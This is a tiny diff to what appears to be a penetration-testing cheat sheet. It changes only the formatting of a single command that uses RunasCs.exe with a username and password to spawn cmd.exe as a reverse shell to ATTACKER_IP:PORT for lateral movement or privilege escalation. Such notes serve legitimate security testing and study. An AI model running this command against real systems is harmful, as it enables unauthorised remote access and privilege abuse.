@@ -8,4 +8,4 @@
 
 ### Command:
 
- - .\RunasCs.exe USERNAME PASSWORD cmd.exe ATTACKER_IP:PORT (Execute a reverse shell as the authenticated user for lateral movement/privesc)
+    .\RunasCs.exe USERNAME PASSWORD cmd.exe ATTACKER_IP:PORT (Execute a reverse shell as the authenticated user for lateral movement/privesc)
